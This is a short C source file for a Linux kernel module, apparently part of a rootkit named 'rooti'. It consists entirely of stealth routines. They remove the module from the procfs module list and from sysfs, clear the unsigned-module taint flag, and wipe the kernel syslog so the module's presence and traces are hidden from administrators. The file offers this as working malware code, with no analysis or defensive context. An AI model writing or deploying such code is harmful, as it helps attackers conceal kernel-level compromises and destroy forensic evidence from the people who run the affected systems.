#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/panic.h>
#include <linux/syslog.h>
#include "module.h"
#include "../../utils.h"

static inline void rooti_hideme_from_procfs(void)
{
    list_del_rcu(&THIS_MODULE->list);
    synchronize_rcu();
}

static inline void rooti_hideme_from_sysfs(void)
{
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

static inline void rooti_remove_taint(void)
{
    clear_bit(TAINT_UNSIGNED_MODULE, rooti_sym_repo.tainted_mask);
}

static inline void rooti_clear_syslog(void)
{
    rooti_sym_repo.do_syslog(SYSLOG_ACTION_CLEAR, NULL, 0, SYSLOG_FROM_PROC);
}

void rooti_hideme(void)
{
    mutex_lock(rooti_sym_repo.module_mutex);
    rooti_hideme_from_procfs();
    rooti_hideme_from_sysfs();
    mutex_unlock(rooti_sym_repo.module_mutex);

    rooti_remove_taint();
    rooti_clear_syslog();
}
